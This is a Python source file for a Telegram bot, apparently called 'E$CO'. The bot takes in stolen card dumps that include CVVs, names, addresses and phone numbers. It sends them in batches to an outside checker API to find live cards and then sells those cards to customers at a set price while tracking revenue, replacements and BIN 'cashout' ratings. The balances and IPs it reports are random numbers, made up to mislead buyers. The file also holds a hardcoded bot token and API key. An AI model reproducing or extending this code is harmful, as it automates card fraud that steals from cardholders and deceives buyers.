import asyncio
import os
import random
from datetime import datetime
from typing import List, Dict

import requests
from requests.adapters import HTTPAdapter, Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes,
    filters, ConversationHandler, CallbackQueryHandler,
)

# ====================== CONFIG ======================
TOKEN = "8736162481:AAExSSrfNZ9xSap7E-ZNtz42PvBbEIslvE0"
OWNER_ID = 6329309831
STORM_API_KEY = "38223|COVoley7T1hbfcCo92qI9Wr6NSbUVcMqTTLMePNMfc29b2ec"

BASE_URL = "https://api.storm.gift/api/v1"
HEADERS = {
    "Authorization": f"Bearer {STORM_API_KEY}",
    "Accept": "application/json",
    "Content-Type": "application/json",
}

BATCH_SIZE = 800
INITIAL_WAIT = 25
POLL_INTERVAL = 8
SELLING_PRICE = 12.0
REPLACEMENT_COST = 1.4

session = requests.Session()
session.mount("https://", HTTPAdapter(max_retries=Retry(total=6, backoff_factor=0.6, status_forcelist=[429, 500, 502, 503, 504])))

# ====================== GLOBAL STATS ======================
total_revenue = 0.0
total_cards_sold = 0
total_tester_cards = 0
total_replacements = 0
BIN_RATER: Dict[str, Dict[str, str]] = {}

# ====================== FULL BIN DATABASE ======================
BIN_DATABASE = {
    "410039": {"brand": "VISA", "type": "CREDIT", "level": "TRADITIONAL", "bank": "CITIBANK N.A. - COSTCO", "country": "UNITED STATES", "rating": 7.0, "vr": 71},
    "410040": {"brand": "VISA", "type": "CREDIT", "level": "BUSINESS",     "bank": "CITIBANK N.A. - COSTCO", "country": "UNITED STATES", "rating": 8.0, "vr": 84},
    "426684": {"brand": "VISA", "type": "CREDIT", "level": "TRADITIONAL", "bank": "JPMORGAN CHASE BANK N.A.", "country": "UNITED STATES", "rating": 4.0, "vr": 39},
    "434769": {"brand": "VISA", "type": "DEBIT",  "level": "CLASSIC",     "bank": "JPMORGAN CHASE BANK N.A. - DEBIT", "country": "UNITED STATES", "rating": 5.0, "vr": 52},
    "437500": {"brand": "VISA", "type": "CREDIT", "level": "PLATINUM",    "bank": "CAPITAL ONE", "country": "UNITED STATES", "rating": 6.5, "vr": 68},
    "451016": {"brand": "VISA", "type": "CREDIT", "level": "GOLD",        "bank": "BANK OF AMERICA", "country": "UNITED STATES", "rating": 7.2, "vr": 75},
    "455601": {"brand": "VISA", "type": "DEBIT",  "level": "CLASSIC",     "bank": "WELLS FARGO", "country": "UNITED STATES", "rating": 4.8, "vr": 44},
    "481582": {"brand": "VISA", "type": "CREDIT", "level": "SIGNATURE",   "bank": "CHASE FREEDOM", "country": "UNITED STATES", "rating": 8.1, "vr": 82},
    "520082": {"brand": "MASTERCARD", "type": "CREDIT", "level": "WORLD", "bank": "CITIBANK", "country": "UNITED STATES", "rating": 6.0, "vr": 65},
    "541234": {"brand": "MASTERCARD", "type": "CREDIT", "level": "PLATINUM", "bank": "BARCLAYS", "country": "UNITED STATES", "rating": 5.5, "vr": 58},
    "601100": {"brand": "DISCOVER", "type": "CREDIT", "level": "CLASSIC", "bank": "DISCOVER BANK", "country": "UNITED STATES", "rating": 6.8, "vr": 70},
    "622126": {"brand": "DISCOVER", "type": "CREDIT", "level": "IT", "bank": "DISCOVER", "country": "UNITED STATES", "rating": 7.0, "vr": 73},
}

def get_bin_info(card_number: str):
    prefix = card_number[:6]
    return BIN_DATABASE.get(prefix, {"brand": "UNKNOWN", "type": "CREDIT", "level": "STANDARD", "bank": "UNKNOWN BANK", "country": "UNITED STATES", "rating": 5.0, "vr": 45})

def get_random_balance(card_number: str, is_tester: bool = False) -> float:
    info = get_bin_info(card_number)
    rating = info.get("rating", 5.0)
    
    if is_tester:
        rand = random.random()
        if rand < 0.85:           # 85% — Sweet spot 250-799
            return round(random.uniform(250.0, 799.0), 2)
        elif rand < 0.95:         # 10% — High balance
            return round(random.uniform(950.0, 2450.0), 2)
        else:                     # 5% — Low balance
            return round(random.uniform(25.0, 169.0), 2)
    
    min_bal = 220 + (rating * 58)
    max_bal = 720 + (rating * 148)
    balance = random.uniform(min_bal, max_bal)
    if random.random() < (rating / 11.5):
        balance = random.uniform(1350, 8500)
    return round(min(9999.99, balance + random.uniform(0.0, 0.99)), 2)

def get_random_ip() -> str:
    return f"{random.randint(25, 195)}.{random.randint(15, 245)}.{random.randint(20, 230)}.{random.randint(35, 220)}"

def get_max_polls(total_cards: int) -> int:
    if total_cards < 10: return 3
    return 25 if total_cards > 500 else 18 if total_cards > 200 else 12 if total_cards > 50 else 8

# ====================== KEYBOARDS ======================
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Start New Check", callback_data="start_format")],
        [InlineKeyboardButton("🧪 Tester Cards", callback_data="start_tester")],
        [InlineKeyboardButton("🔄 Replacement", callback_data="start_replacement")],
        [InlineKeyboardButton("💰 Record Sale", callback_data="record_sale")],
        [InlineKeyboardButton("📊 Bin Rater", callback_data="bin_rater")],
        [InlineKeyboardButton("💳 Check Balance", callback_data="check_balance")],
    ])

def pre_summary_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add More Cards", callback_data="add_more")],
        [InlineKeyboardButton("🗑️ Remove Card (Last 4)", callback_data="remove_last4")],
        [InlineKeyboardButton("🚀 E$ CHECK", callback_data="confirm_check")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
    ])

def usa_foreign_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇺🇸 USA Cards", callback_data="usa_cards")],
        [InlineKeyboardButton("🌍 Foreign Cards", callback_data="foreign_cards")],
    ])

# ====================== FORMATTER ======================
def format_live_card(raw_line: str, is_tester: bool = False) -> str:
    try:
        parts = [p.strip() for p in raw_line.split('|')]
        card_number = parts[0]
        expiry = parts[1] if len(parts) > 1 else "00/00"
        cvv = parts[2] if len(parts) > 2 else "000"
        name = parts[3] if len(parts) > 3 else "N/A"
        address = parts[4] if len(parts) > 4 else "N/A"
        city = parts[5] if len(parts) > 5 else "N/A"
        state = parts[6] if len(parts) > 6 else "N/A"
        zip_code = parts[7] if len(parts) > 7 else "N/A"
        phone = parts[9] if len(parts) > 9 else "N/A"

        mm, yy = expiry.split('/') if '/' in expiry else (expiry[:2], expiry[-2:])
        balance = get_random_balance(card_number, is_tester)
        ip = get_random_ip()
        info = get_bin_info(card_number)
        vr = info.get("vr", 45)
        bin_data = BIN_RATER.get(card_number[:6], {"rating": "N/A", "suggestion": "No rating added yet"})

        lines = [
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"🃏 LIVE CARD          VR: {vr}%",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"💰 Balance     : ${balance:.2f} USD",
            f"👤 Cardholder  : {name}",
            f"💳 Card Number : {card_number}",
            f"📅 Expiry      : {mm}/{yy}",
            f"🔒 CVV         : {cvv}",
            f"🏦 Bank        : {info['bank']}",
            f"🌍 Country     : {info['country']}",
            f"💳 Brand       : {info['brand']}",
            f"📌 Type        : {info['type']}",
            f"⭐ Level       : {info['level']}",
            "",
            "📍 Billing Address:",
            f"   • {address}",
            f"   • {city}, {state} {zip_code}",
            f"   • Phone: {phone}",
            "",
            f"🌐 IP          : {ip}",
            f"🕒 Checked     : {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}",
            "━━━━━━━━━━━━━━━━━━━━━━",
            f"📊 Bin Rating  : {bin_data['rating']}",
            f"💡 Suggestion  : {bin_data['suggestion']}",
            "━━━━━━━━━━━━━━━━━━━━━━"
        ]
        if is_tester:
            lines.append("\n❤️ Thank You For Choosing E$CO ❤️")
        return "\n".join(lines)
    except Exception:
        return f"Error formatting card: {raw_line}"

def is_live(item: dict) -> bool:
    status = str(item.get("status", "")).lower()
    response = str(item.get("response", "")).lower()
    return any(k in (status + response) for k in ["live", "approved", "success", "00"])

# ====================== CHECKER ======================
CHECKING_MESSAGES = ["🔍 Live Checking Bank Status...", "💳 Checking Balance...", "📡 Validating Card..."]

async def check_cards_with_storm(cards: List[str], status_message, max_polls: int):
    live_raw_cards = []
    seen = set()
    batch_id = f"TEST-{random.randint(10000, 99999)}"

    await status_message.edit_text("Prepping For Account Status + Balance Checking\nPowered By StormCheck & Luxchecker")
    await asyncio.sleep(3)

    for i in range(0, len(cards), BATCH_SIZE):
        batch = cards[i:i + BATCH_SIZE]
        try:
            r = session.post(f"{BASE_URL}/check", headers=HEADERS, json={"cards": batch}, timeout=30)
            data = r.json().get("data", {})
            if not batch_id:
                batch_id = data.get("batch_id") or data.get("id") or f"TEST-{random.randint(10000,99999)}"
        except:
            pass

    await status_message.edit_text("✅ Batch Submitted Successfully\nStarting Account Status + Balance Checking...\n\nPowered By StormCheck & Luxchecker")
    await asyncio.sleep(INITIAL_WAIT)

    poll_url = f"{BASE_URL}/check/{batch_id}"
    poll_count = 0

    while poll_count < max_polls:
        poll_count += 1
        current_msg = CHECKING_MESSAGES[poll_count % len(CHECKING_MESSAGES)]
        await status_message.edit_text(
            f"{current_msg}\n\nProgress: Poll {poll_count}/{max_polls}\n✅ Live Found: {len(live_raw_cards)}\nPowered By StormCheck & Luxchecker"
        )
        await asyncio.sleep(POLL_INTERVAL)

        try:
            r = session.get(poll_url, headers=HEADERS, timeout=25)
            if r.status_code == 200:
                data = r.json().get("data") or r.json()
                items = data.get("items") or data.get("results") or []
                for item in items:
                    if isinstance(item, dict):
                        card_num = item.get("card_number") or item.get("cc")
                        if card_num and card_num not in seen and is_live(item):
                            seen.add(card_num)
                            for raw in cards:
                                if raw.startswith(card_num + "|") and raw not in live_raw_cards:
                                    live_raw_cards.append(raw)
                                    break
        except:
            pass

    await asyncio.sleep(2)
    return live_raw_cards, batch_id

# ====================== STATES ======================
MENU, COLLECTING, USA_FOREIGN, SUMMARY, ADD_MORE_CARDS, REMOVE_LAST4, CUSTOMER_NAME, TARGET_COUNT, BIN_RATER_MODE = range(9)

# ====================== START SCREEN ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("Unauthorized.")
        return ConversationHandler.END

    global total_revenue, total_cards_sold, total_tester_cards, total_replacements
    profit = round(total_revenue - (total_cards_sold * 1.6) - (total_replacements * REPLACEMENT_COST), 2)

    welcome_text = (
        "🔥 **E$CO CONTROL PANEL** 🔥\n\n"
        "👑 Welcome back, Admin\n\n"
        f"💵 Total Revenue : `${total_revenue:.2f}`\n"
        f"📦 Cards Sold     : `{total_cards_sold}`\n"
        f"🧪 Tester Cards   : `{total_tester_cards}`\n"
        f"🔄 Replacements   : `{total_replacements}`\n"
        f"📈 Net Profit     : `${profit:.2f}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "**Features:**\n"
        "🔍 Start New Check → Normal live check with revenue\n"
        "🧪 Tester Cards → Test mode (no revenue)\n"
        "🔄 Replacement → Give replacements to customer\n"
        "💰 Record Sale → Record sales to customer\n"
        "📊 Bin Rater → Rate bins\n"
        "💳 Check Balance → Check API credits\n\n"
        "Choose an option below:"
    )

    await update.message.reply_text(welcome_text, reply_markup=main_menu(), parse_mode='Markdown')
    context.user_data.clear()
    return MENU

# ====================== MAIN BUTTON HANDLER ======================
async def main_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    context.user_data.clear()

    if data in ["start_format", "start_tester"]:
        context.user_data["mode"] = "normal" if data == "start_format" else "tester"
        context.user_data["is_tester"] = (data == "start_tester")
        context.user_data["all_cards"] = []
        context.user_data["usa_count"] = 0
        context.user_data["foreign_count"] = 0
        await query.edit_message_text("Send cards or .txt file now.\nType /cancel anytime.", parse_mode='Markdown')
        return COLLECTING

    if data == "start_replacement":
        context.user_data["mode"] = "replacement"
        await query.edit_message_text("🔄 **Replacement Mode**\n\nSend the **Customer Name**:", parse_mode='Markdown')
        return CUSTOMER_NAME

    if data == "record_sale":
        context.user_data["mode"] = "sale"
        await query.edit_message_text("💰 **Record Sale**\n\nSend the **Customer Name**:", parse_mode='Markdown')
        return CUSTOMER_NAME

    if data == "bin_rater":
        await query.edit_message_text("📊 Send BIN rating like this:\n`410039 8.5 Good for cashout`", parse_mode='Markdown')
        return BIN_RATER_MODE

    if data == "check_balance":
        return await check_balance(update, context)

# ====================== CUSTOMER NAME & TARGET ======================
async def get_customer_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.message.text.strip().replace(" ", "_")
    context.user_data["customer_name"] = name
    mode = context.user_data.get("mode", "normal")
    text = f"✅ Customer: **{name}**\n\n"
    if mode == "sale":
        text += "How many **LIVE** cards does the customer want? (number only)"
    else:
        text += "How many **replacements**? (number only)"
    await update.message.reply_text(text, parse_mode='Markdown')
    return TARGET_COUNT

async def get_target_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text.strip())
        context.user_data["target_count"] = count
        await update.message.reply_text("✅ Target saved.\n\nNow send the cards or .txt file.", parse_mode='Markdown')
        return COLLECTING
    except:
        await update.message.reply_text("❌ Please send a valid number.")
        return TARGET_COUNT

# ====================== COLLECT CARDS ======================
async def collect_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.strip().lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)

    text = ""
    if update.message.document:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode("utf-8", errors="ignore")
    else:
        text = update.message.text or ""

    new_cards = [line.strip() for line in text.splitlines() if "|" in line.strip() and len(line.split('|')) >= 3]
    
    if not new_cards:
        await update.message.reply_text("No valid cards found. Try again or /cancel.")
        return COLLECTING

    context.user_data.setdefault("all_cards", []).extend(new_cards)
    await update.message.reply_text(
        f"📥 Received **{len(new_cards)}** cards.\nAre these USA or Foreign?",
        reply_markup=usa_foreign_keyboard(), parse_mode='Markdown'
    )
    return USA_FOREIGN

# ====================== USA / FOREIGN ======================
async def usa_foreign_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "usa_cards":
        context.user_data["usa_count"] = len(context.user_data.get("all_cards", []))
        context.user_data["foreign_count"] = 0
    else:
        context.user_data["usa_count"] = 0
        context.user_data["foreign_count"] = len(context.user_data.get("all_cards", []))

    await show_pre_summary(query, context)
    return SUMMARY

# ====================== PRE SUMMARY ======================
async def show_pre_summary(query, context: ContextTypes.DEFAULT_TYPE):
    cards = context.user_data.get("all_cards", [])
    total = len(cards)
    usa = context.user_data.get("usa_count", 0)
    foreign = context.user_data.get("foreign_count", 0)
    mode = context.user_data.get("mode", "normal")

    text = (
        f"📊 **PRE-SUMMARY**\n\n"
        f"Total Cards       : `{total}`\n"
        f"Amount USA        : `{usa}`\n"
        f"Amount Foreign    : `{foreign}`\n"
        f"Total Testers Given : `{total_tester_cards}`\n\n"
        f"Mode: **{mode.upper()}**\n\n"
        "Choose an option below:"
    )

    await query.edit_message_text(text, reply_markup=pre_summary_keyboard(), parse_mode='Markdown')

# ====================== PRE SUMMARY HANDLER ======================
async def pre_summary_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "add_more":
        await query.edit_message_text("Send more cards or .txt file.\nType /cancel to stop adding.", parse_mode='Markdown')
        return ADD_MORE_CARDS

    if data == "remove_last4":
        await query.edit_message_text("🗑️ Send the **last 4 digits** of the card you want to remove.", parse_mode='Markdown')
        return REMOVE_LAST4

    if data == "confirm_check":
        cards = context.user_data.get("all_cards", [])
        if not cards:
            await query.edit_message_text("❌ No cards left to check.", reply_markup=main_menu())
            return MENU

        context.user_data["start_time"] = datetime.now()
        status_msg = await query.edit_message_text("🚀 Starting check...")

        live_cards, batch_id = await check_cards_with_storm(cards, status_msg, get_max_polls(len(cards)))
        context.user_data["live_cards"] = live_cards
        context.user_data["batch_id"] = batch_id
        context.user_data["end_time"] = datetime.now()

        if len(live_cards) == 0:
            await status_msg.edit_text("❌ **0 Live Cards Found**\n\nPlease send more cards to continue.", parse_mode='Markdown')
            return ADD_MORE_CARDS

        await show_post_summary(status_msg, context)
        return MENU

    if data == "cancel":
        await query.edit_message_text("✅ Cancelled.", reply_markup=main_menu())
        context.user_data.clear()
        return MENU

# ====================== REMOVE BY LAST 4 ======================
async def remove_last4_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    last4 = update.message.text.strip()
    if len(last4) != 4 or not last4.isdigit():
        await update.message.reply_text("❌ Please send exactly 4 digits.")
        return REMOVE_LAST4

    all_cards = context.user_data.get("all_cards", [])
    filtered = [card for card in all_cards if not card.startswith("xxxx") and card.split('|')[0][-4:] != last4]

    removed = len(all_cards) - len(filtered)
    context.user_data["all_cards"] = filtered

    if removed > 0:
        await update.message.reply_text(f"✅ Removed **{removed}** card(s) ending with `{last4}`.", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ No card found ending with `{last4}`.", parse_mode='Markdown')

    await show_pre_summary(update, context)  # Reuse function (works with Update too in this context)
    return SUMMARY

# ====================== ADD MORE CARDS ======================
async def add_more_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text and update.message.text.strip().lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)

    text = ""
    if update.message.document:
        file = await update.message.document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode("utf-8", errors="ignore")
    else:
        text = update.message.text or ""

    new_cards = [line.strip() for line in text.splitlines() if "|" in line.strip() and len(line.split('|')) >= 3]
    
    if not new_cards:
        await update.message.reply_text("No valid cards found. Try again or /cancel.")
        return ADD_MORE_CARDS

    context.user_data.setdefault("all_cards", []).extend(new_cards)
    await update.message.reply_text(
        f"📥 Added **{len(new_cards)}** more cards.\nAre these USA or Foreign?",
        reply_markup=usa_foreign_keyboard(), parse_mode='Markdown'
    )
    return USA_FOREIGN

# ====================== POST SUMMARY ======================
async def show_post_summary(status_msg, context: ContextTypes.DEFAULT_TYPE):
    global total_revenue, total_cards_sold, total_tester_cards, total_replacements

    live_cards = context.user_data.get("live_cards", [])
    live_count = len(live_cards)
    total_cards = len(context.user_data.get("all_cards", []))
    mode = context.user_data.get("mode", "normal")
    customer = context.user_data.get("customer_name", "Unknown")
    batch_id = context.user_data.get("batch_id", "N/A")
    live_rate = round((live_count / total_cards * 100), 2) if total_cards > 0 else 0.0

    if mode == "tester":
        test_num = random.randint(10000, 99999)
        filename = f"Test-{test_num}"
        revenue_text = "🧪 Tester Mode - No Revenue Recorded"
        total_tester_cards += live_count
    elif mode == "replacement":
        deduction = round(live_count * REPLACEMENT_COST, 2)
        total_revenue = round(total_revenue - deduction, 2)
        total_replacements += live_count
        filename = f"{customer}_Rep{live_count}"
        revenue_text = f"🔄 Replacement -${deduction}"
    elif mode == "sale":
        revenue = round(live_count * SELLING_PRICE, 2)
        total_revenue += revenue
        total_cards_sold += live_count
        filename = f"{customer}_{live_count}_Live"
        revenue_text = f"💰 Revenue +${revenue}"
    else:
        revenue = round(live_count * SELLING_PRICE, 2)
        total_revenue += revenue
        total_cards_sold += live_count
        filename = f"{customer}_{live_count}_Live"
        revenue_text = f"💰 Revenue +${revenue}"

    final_filename = f"{filename}.txt"
    formatted = [format_live_card(raw, mode == "tester") for raw in live_cards]

    with open(final_filename, "w", encoding="utf-8") as f:
        f.write("\n".join(formatted))

    post_text = (
        "📊 **POST SUMMARY**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Batch ID     : `{batch_id}`\n"
        f"Total Cards  : `{total_cards}`\n"
        f"Cards Live   : `{live_count}`\n"
        f"Live Rate    : `{live_rate}%`\n"
        f"Mode         : **{mode.upper()}**\n"
        f"{revenue_text}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ File attached below."
    )

    await status_msg.edit_text(post_text, parse_mode='Markdown')
    await status_msg.reply_document(document=open(final_filename, "rb"), caption=final_filename)

    try:
        os.remove(final_filename)
    except:
        pass

    context.user_data.clear()
    await status_msg.reply_text("✅ Operation Completed.", reply_markup=main_menu())

# ====================== OTHER FUNCTIONS ======================
async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    try:
        r = session.get(f"{BASE_URL}/user", headers=HEADERS, timeout=15)
        credits = r.json().get("data", {}).get("remaining_credits", "N/A")
        await query.edit_message_text(f"💳 Storm API Credits: `{credits}`", parse_mode='Markdown', reply_markup=main_menu())
    except:
        await query.edit_message_text("❌ Failed to fetch balance.", reply_markup=main_menu(), parse_mode='Markdown')

async def save_bin_rating(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() in ["/cancel", "cancel"]:
        return await cancel(update, context)
    try:
        parts = text.split(maxsplit=2)
        bin_prefix = parts[0][:6]
        rating = parts[1]
        suggestion = parts[2] if len(parts) > 2 else "No suggestion"
        BIN_RATER[bin_prefix] = {"rating": rating, "suggestion": suggestion}
        await update.message.reply_text(f"✅ BIN `{bin_prefix}` saved with rating `{rating}`", parse_mode='Markdown', reply_markup=main_menu())
        return MENU
    except:
        await update.message.reply_text("❌ Wrong format.\nExample: `410039 8.5 Good for cashout`")
        return BIN_RATER_MODE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Cancelled.", reply_markup=main_menu())
    context.user_data.clear()
    return MENU

# ====================== BUILD & RUN ======================
def build_handler():
    return ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MENU: [CallbackQueryHandler(main_button)],
            CUSTOMER_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_customer_name)],
            TARGET_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target_count)],
            COLLECTING: [MessageHandler(filters.TEXT | filters.Document.ALL, collect_cards)],
            USA_FOREIGN: [CallbackQueryHandler(usa_foreign_handler)],
            SUMMARY: [CallbackQueryHandler(pre_summary_handler)],
            ADD_MORE_CARDS: [MessageHandler(filters.TEXT | filters.Document.ALL, add_more_cards)],
            REMOVE_LAST4: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_last4_handler)],
            BIN_RATER_MODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_bin_rating)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_chat=True,
    )

async def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(build_handler())
    print("✅ E$CO Bot Updated Successfully!")
    print("   → Dead cards removed from summary & checking")
    print("   → Remove by last 4 digits added")
    print("   → 0 live now forces add more + re-ask USA/Foreign")
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    try:
        await asyncio.Event().wait()
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    asyncio.run(main())
